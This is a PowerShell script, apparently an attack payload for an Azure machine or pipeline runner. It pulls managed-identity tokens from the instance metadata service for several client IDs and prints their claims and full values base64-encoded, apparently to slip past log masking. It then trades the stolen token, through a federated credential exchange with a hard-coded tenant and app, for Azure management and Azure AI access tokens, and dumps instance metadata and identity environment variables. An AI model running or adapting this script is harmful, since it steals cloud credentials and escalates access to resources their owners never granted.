Write-Host "P208W_START"
try { Write-Host ("P208W_USER " + (whoami) + " HOST " + (hostname)) } catch {}
$ErrorActionPreference='Continue'
$res='api://AzureADTokenExchange'
$resc=[uri]::EscapeDataString($res)
$cids=@('', '53d54d02-978d-4305-8572-583cf6711c4f','62b7cfed-4d25-454f-880e-010dc21455ac','5f81938c-2544-4f1f-9251-dd9de5b8a81b','e122d207-b942-4f93-8627-cd058c8bfa11')
foreach($cid in $cids){
  $u="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$resc"
  if($cid -ne ''){ $u="$u&client_id=$cid" }
  Write-Host "P208W_IMDS_REQ cid=$cid"
  try {
    $r=Invoke-RestMethod -Uri $u -Headers @{Metadata='true'} -TimeoutSec 20
    $tok=$r.access_token
    Write-Host "P208W_IMDS_OK cid=$cid len=$($tok.Length)"
    $parts=$tok.Split('.')
    $p=$parts[1].Replace('-','+').Replace('_','/')
    while($p.Length % 4 -ne 0){ $p="$p=" }
    $json=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
    Write-Host "P208W_IMDS_CLAIMS cid=$cid $json"
    Write-Host "P208W_IMDS_TOKB64 cid=$cid $([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($tok)))"
    foreach($scope in @('https://management.azure.com/.default','https://ai.azure.com/.default')){
      $body=@{grant_type='client_credentials';client_id='2efaf292-00a0-426c-ba7d-f5d2b214b8fc';scope=$scope;client_assertion_type='urn:ietf:params:oauth:client-assertion-type:jwt-bearer';client_assertion=$tok}
      try {
        $tr=Invoke-RestMethod -Method Post -Uri 'https://login.microsoftonline.com/16b3c013-d300-468d-ac64-7eda0820b6d3/oauth2/v2.0/token' -Body $body -ContentType 'application/x-www-form-urlencoded' -TimeoutSec 20
        Write-Host "P208W_FIC_SUCCESS cid=$cid scope=$scope"
        Write-Host "P208W_FIC_TOKB64 cid=$cid scope=$scope $([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($tr.access_token)))"
      } catch {
        Write-Host "P208W_FIC_ERR cid=$cid scope=$scope status=$($_.Exception.Response.StatusCode.value__) msg=$($_.ErrorDetails.Message)"
      }
    }
  } catch {
    Write-Host "P208W_IMDS_ERR cid=$cid msg=$($_.Exception.Message) detail=$($_.ErrorDetails.Message)"
  }
}
Write-Host "P208W_IDENTITY_ENDPOINT=$env:IDENTITY_ENDPOINT MSI_ENDPOINT=$env:MSI_ENDPOINT IDENTITY_HEADER_SET=$([bool]$env:IDENTITY_HEADER) MSI_SECRET_SET=$([bool]$env:MSI_SECRET)"
try { $im=Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' -Headers @{Metadata='true'} -TimeoutSec 10; Write-Host ("P208W_IMDS_INSTANCE " + ($im | ConvertTo-Json -Compress)) } catch { Write-Host "P208W_IMDS_INSTANCE_ERR $($_.Exception.Message)" }
Write-Host "P208W_DONE"
exit 0
